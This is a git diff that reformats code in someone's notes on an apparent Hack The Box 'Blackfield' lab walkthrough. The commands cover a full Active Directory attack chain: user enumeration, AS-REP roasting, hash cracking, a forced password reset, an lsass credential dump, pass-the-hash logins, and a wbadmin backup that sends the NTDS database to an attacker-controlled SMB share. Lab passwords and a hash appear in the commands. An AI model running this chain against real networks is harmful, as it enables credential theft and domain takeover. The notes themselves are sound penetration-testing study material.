@@ -97,10 +97,14 @@ GitHub:
 
 https://github.com/ropnop/kerbrute
 
-`kerbrute -h`
+```bash
+kerbrute -h
+```
 
 
-`./kerbrute userenum --dc 10.10.10.192 -d blackfield -o kerbrute.username.out users.lst`
+```bash
+./kerbrute userenum --dc 10.10.10.192 -d blackfield -o kerbrute.username.out users.lst
+```
 
 ![[Pasted image 20250109185104.png]]
 Found three valid usernames. Save these to a file.
@@ -110,7 +114,9 @@ Found three valid usernames. Save these to a file.
 Use [[Impacket]] #getnpusers to perform #ASREProast
 
 
-`./GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -userfile users.lst blackfield/`
+```bash
+./GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -userfile users.lst blackfield/
+```
 
 Got a hash 
 
@@ -119,9 +125,13 @@ Crack this hash with #hashcat
 
 Figure out hashcat mode quickly:
 
-`./hashcat --example-hashes | grep krb5asrep`
+```
+./hashcat --example-hashes | grep krb5asrep
+```
 
-`./hashcat --example-hashes | grep -B5 krb5asrep`
+```
+./hashcat --example-hashes | grep -B5 krb5asrep
+```
 
 Need mode `18200`
 
@@ -129,13 +139,17 @@ Need mode `18200`
 
 Crack the hash. 
 
-`./hashcat -m 18200 hashes/blackfield /opt/wordlist/rockyou.txt`
+```
+./hashcat -m 18200 hashes/blackfield /opt/wordlist/rockyou.txt
+```
 
 ![[Pasted image 20250109201716.png]]
 
 When hashcat is done..use `--show` flag
 
-`./hashcat -m 18200 hashes/blackfield --show`
+```
+./hashcat -m 18200 hashes/blackfield --show
+```
 
 ![[Pasted image 20250109201827.png]]
 
@@ -143,31 +157,46 @@ Password is: `#00^Blackknight`
 
 Use these new creds with #crackmapexec 
 
-`cme smb 10.10.10.192 --shares -u support -p '#00^Blackknight'
+```
+cme smb 10.10.10.192 --shares -u support -p '#00^Blackknight'
+```
 
 ![[Pasted image 20250109202117.png]]
 
 Trying to connect with #rpcclient again
 
-`rpcclient -U support 10.10.10.192`
+```
+rpcclient -U support 10.10.10.192
+```
 
 ![[Pasted image 20250109202457.png]]
-Run `enumdomusers`
+Run 
+```
+enumdomusers
+```
 
 ![[Pasted image 20250109202534.png]]
 Lots of users. Create a new users file. 
 
 Cleanup this new `tmp` file with 
 
-`cat tmp | awk -F'\[' '{print $1}'`
+```
+cat tmp | awk -F'\[' '{print $1}'
+```
 
-`cat tmp | awk -F'\[' '{print $2}'`
+```
+cat tmp | awk -F'\[' '{print $2}'
+```
 
-`cat tmp | awk -F'\[' '{print $2}' | awk -F '\]' '{print $1}' > users.lst`
+```
+cat tmp | awk -F'\[' '{print $2}' | awk -F '\]' '{print $1}' > users.lst
+```
 
 Run #getnpusers again 
 
-`GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile users.lst blackfield/`
+```
+GetNPUsers.py -dc-ip 10.10.10.192 -no-pass -usersfile users.lst blackfield/
+```
 
 ![[Pasted image 20250109203114.png]]
 No new hashes.
@@ -181,14 +210,18 @@ Running into issues so going to edit `/etc/resolv.conf`
 ![[Pasted image 20250109203720.png]]
 Deleted stuff from `/etc/hosts`
 
-`python3 bloodhound.py -u support -p '#00^Blackknight' -ns 10.10.10.192 -d blackfield.local -c all`
+```
+python3 bloodhound.py -u support -p '#00^Blackknight' -ns 10.10.10.192 -d blackfield.local -c all
+```
 
 ![[Pasted image 20250109203952.png]]
 Got some `.json` files from this. 
 
 Start #neo4j 
 
-`sudo neo4j console`
+```
+sudo neo4j console
+```
 
 Execute Bloodhound and login to console
 
@@ -223,7 +256,9 @@ Discover the `support` user can change `audit2020`'s password without knowing th
 ![[Pasted image 20250109205215.png]]
 Change this user's password from linux with #rpcclient 
 
-`rpcclient -U support 10.10.10.192 `
+```
+rpcclient -U support 10.10.10.192
+```
 
 Set the password with 
 
@@ -232,30 +267,44 @@ Set the password with
 ![[Pasted image 20250109205719.png]]
 It failed tho because password was not complex enough.
 
-`setuserinfo2 Audit2020 23 'PleaseSub!'`
+```
+setuserinfo2 Audit2020 23 'PleaseSub!'
+```
 
 Test it out with #crackmapexec 
 
-`cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!'`
+```
+cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!'
+```
 
 ![[Pasted image 20250109205908.png]]
 
 Check shares and we can read the forensic / audit share now. 
 
-`cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!' --shares`
+```
+cme smb 10.10.10.192 -u Audit2020 -p 'PleaseSub!' --shares
+```
 
 ![[Pasted image 20250109210028.png]]
 
 Ensure stuff is unmounted with
 
-`sudo umount /mnt`
+```
+sudo umount /mnt
+```
 
-`sudo mount -t cifs -o 'username=audit2020,password=PleaseSub!' //10.10.10.192/forensic /mnt`
+```
+sudo mount -t cifs -o 'username=audit2020,password=PleaseSub!' //10.10.10.192/forensic /mnt
+```
 
 ![[Pasted image 20250109210237.png]]
-`cd /mnt`
+```
+cd /mnt
+```
 
-`ls -la`
+```
+ls -la
+```
 
 ![[Pasted image 20250109210308.png]]
 Look through these directories
@@ -275,13 +324,17 @@ https://github.com/skelsec/pypykatz
 
 It's maybe in pip repository.
 
-`pip3 install pypykatz`
+```
+pip3 install pypykatz
+```
 
 Unzip `lsass.zip` to get `lsass.DMP` file
 
 Finding flags to use with pypykatz and lsa
 
-`pypykatz lsa -h`
+```
+pypykatz lsa -h
+```
 
 ![[Pasted image 20250110190623.png]]
 Running `pypykatz lsa minidump lsass.DMP > lsass.out`
@@ -309,7 +362,9 @@ It fails.
 
 Trying other user
 
-`cme smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d`
+```
+cme smb 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+```
 
 ![[Pasted image 20250110191756.png]]
 
@@ -317,7 +372,9 @@ This works but no pwn3d.
 
 Use #evilwinrm to login. 
 
-`evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+```
+evil-winrm -i 10.10.10.192 -u svc_backup -H 9658d1d1dcd9250115e2205d9f48400d
+```
 
 ![[Pasted image 20250110191933.png]]
 
@@ -336,46 +393,64 @@ SeBackupPrivilege:
 ![[Pasted image 20250110200617.png]]
 Use #impacket #smbserver to set up a share on attacker box.
 
-`sudo smbserver.py -smb2support -user ippsec -password PleaseSubscribe SendMeYoData $ (pwd)`
+```
+sudo smbserver.py -smb2support -user ippsec -password PleaseSubscribe SendMeYoData $ (pwd)
+```
 
 ![[Pasted image 20250110201022.png]]
 
 Access this local share from remote win-rm shell 
 
-`net use x: \\10.10.14.2\SendMeYoData /user: ippsec PleaseSubscribe`
+```
+net use x: \\10.10.14.2\SendMeYoData /user: ippsec PleaseSubscribe
+```
 
 ![[Pasted image 20250110201148.png]]
 
 Now get wbadmin to send the ntds backup file to our impacket share. 
 
-`wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\`
+```
+wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\
+```
 
 ![[Pasted image 20250110201423.png]]
 If there's a logon prompt for [Y] or [N] can echo y into prompt like 
 
-`echo y | wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\`
+```
+echo y | wbadmin start backup -backuptarget:\\10.10.14.2\SendMeYoData -include:c: \windows\ntds\
+```
 
 ![[Pasted image 20250110201724.png]]
 This fails because it wants an NTFS folder. 
 ![[Pasted image 20250110201821.png]]
 Create an NTFS folder:
 
-`dd if=/dev/zero of=ntfs.disk bs=1024M count=2`
+```
+dd if=/dev/zero of=ntfs.disk bs=1024M count=2
+```
 ![[Pasted image 20250110202001.png]]
 
-`sudo losetup -fP ntfs.disk`
+```
+sudo losetup -fP ntfs.disk
+```
 
 Check mount with 
 
-`losetup -a`
+```
+losetup -a
+```
 
 ![[Pasted image 20250110202212.png]]
 
-`sudo mkfs.ntfs /dev/loop0`
+```
+sudo mkfs.ntfs /dev/loop0
+```
 
 ![[Pasted image 20250110202259.png]]
 
-`sudo mount /dev/loop0 smb/`
+```
+sudo mount /dev/loop0 smb/
+```
 
 `mount | grep smb`
 
